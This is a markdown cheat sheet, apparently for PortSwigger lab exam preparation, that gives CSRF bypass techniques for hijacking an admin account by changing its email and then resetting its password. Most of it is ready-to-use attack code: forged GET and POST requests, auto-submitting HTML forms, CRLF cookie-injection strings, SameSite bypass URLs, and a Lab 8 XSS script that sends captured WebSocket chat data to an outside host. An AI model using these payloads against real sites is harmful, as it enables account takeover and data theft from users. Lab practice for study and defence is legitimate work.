# CSRF (Cross-Site Request Forgery) - Stage 2

## 🎯 Target Location

**Primary Target:** Email/Password Change Functionality

**Goal:** Change admin's email → Reset admin's password → Login as admin

## 🔥 Attack Flow

1. Find CSRF vulnerability in email change
2. Craft CSRF PoC to change admin's email to yours
3. Deliver exploit to admin
4. Use "Forgot password" to reset admin's password
5. Login as admin

## 📋 CSRF Bypass Techniques

### Lab 1: Token Validation Depends on Request Method
**Bypass:** Change POST to GET

**Original Request:**
```http
POST /my-account/change-email HTTP/1.1
Content-Type: application/x-www-form-urlencoded

email=attacker@evil.com&csrf=abc123
```

**Bypass:**
```http
GET /my-account/change-email?email=attacker@evil.com HTTP/1.1
```

**Exploit:**
```html
<img src="https://vulnerable-site.com/my-account/change-email?email=attacker@evil.com">
```

---

### Lab 2: Token Validation Depends on Token Being Present
**Bypass:** Simply remove CSRF token

**Original Request:**
```http
POST /my-account/change-email HTTP/1.1

email=attacker@evil.com&csrf=abc123
```

**Bypass:**
```http
POST /my-account/change-email HTTP/1.1

email=attacker@evil.com
```

---

### Lab 3: Token Not Tied to User Session
**Bypass:** Use your own CSRF token for admin

**Steps:**
1. Get your own CSRF token from HTML
2. Use it in CSRF PoC for admin
3. Token is valid but not session-specific

---

### Lab 4: Token Tied to Non-Session Cookie
**Bypass:** Set victim's csrfKey cookie via CRLF injection

**Observe:**
```http
Set-Cookie: csrfKey=abc123; LastSearchTerm=test
```

**Exploit:**
```html
<script>
location="https://vulnerable-site.com/?search=w;%0aSet-Cookie:+csrfKey=YOUR_KEY"
</script>
```

Then deliver CSRF PoC with your CSRF token.

---

### Lab 5: Token Duplicated in Cookie
**Bypass:** Set both cookie and parameter to same value

**CRLF Injection:**
```
/?search=w%0d%0aSet-Cookie:%20csrf=kek%3b%20SameSite=None
```

**CSRF PoC:**
```html
<form method="POST" action="https://vulnerable-site.com/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="csrf" value="kek">
</form>
<script>document.forms[0].submit();</script>
```

---

### Lab 6: SameSite Lax Bypass via Method Override
**Bypass:** Use GET with `_method=POST` parameter

**Payload:**
```
/my-account/change-email?email=attacker@evil.com&_method=POST
```

**Exploit:**
```html
<script>
location="https://vulnerable-site.com/my-account/change-email?email=attacker@evil.com&_method=POST"
</script>
```

---

### Lab 7: SameSite Strict Bypass via Client-Side Redirect
**Bypass:** Use path traversal in redirect parameter

**Payload:**
```
/post/comment/confirmation?postId=1../../../my-account/change-email?email=attacker@evil.com%26submit=1
```

---

### Lab 8: SameSite Strict Bypass via Sibling Domain
**Bypass:** XSS on sibling domain (cms-xxx.com)

**Step 1:** Craft XSS payload (URL-encode it)
```html
<script>
var ws = new WebSocket('wss://vulnerable-site.com/chat');
ws.onopen = function() { ws.send("READY"); };
ws.onmessage = function(event) {
  fetch('https://burp.oastify.com', {
    method: 'POST',
    mode: 'no-cors',
    body: event.data
  });
};
</script>
```

**Step 2:** Deliver via sibling domain
```html
<script>
location="https://cms-vulnerable-site.com/login?username=URL-ENCODED-PAYLOAD&password=password"
</script>
```

---

### Lab 9: SameSite Lax Bypass via Cookie Refresh
**Bypass:** Send CSRF PoC twice with delay

**Strategy:**
1. Send CSRF PoC to victim
2. Wait 5-10 seconds
3. Send CSRF PoC again (cookie refreshed)

---

### Lab 10: CSRF Refresh Password (isLoggedIn=true)
**Bypass:** Set `isLoggedIn=true` cookie

**CRLF Injection:**
```
/?search=w%0d%0aSet-Cookie:%20isLoggedIn=true%3b%20SameSite=None
```

**CSRF PoC:**
```html
<form method="POST" action="https://vulnerable-site.com/my-account/change-password">
  <input type="hidden" name="new-password" value="hacked123">
</form>
<script>document.forms[0].submit();</script>
```

## 🛠️ CSRF PoC Generation

### Using Burp Suite
1. Right-click request → Engagement tools → Generate CSRF PoC
2. Modify as needed
3. Test in browser
4. Deliver via exploit server

### Manual CSRF PoC Template
```html
<html>
  <body>
    <form method="POST" action="https://vulnerable-site.com/my-account/change-email">
      <input type="hidden" name="email" value="attacker@evil.com">
      <input type="hidden" name="csrf" value="bypass-value">
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## 🎓 Exam Tips

1. **Target email change functionality** - Most common CSRF location
2. **Try method change first** - POST → GET is easiest bypass
3. **Remove CSRF token** - Sometimes validation is optional
4. **Use Burp's CSRF PoC generator** - Saves time
5. **Combine with XSS** - CSRF + XSS = powerful attack
6. **Check for SameSite cookies** - May need bypass techniques

## 🔍 Testing Checklist

- [ ] Find email/password change functionality
- [ ] Check if CSRF token exists
- [ ] Try removing CSRF token
- [ ] Try changing POST to GET
- [ ] Test if token is session-specific
- [ ] Look for cookie injection points
- [ ] Check for SameSite cookie attributes
- [ ] Generate and test CSRF PoC
- [ ] Deliver exploit to victim

## 📚 References

- [PortSwigger CSRF](https://portswigger.net/web-security/csrf)
- [SameSite Cookies Explained](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions)
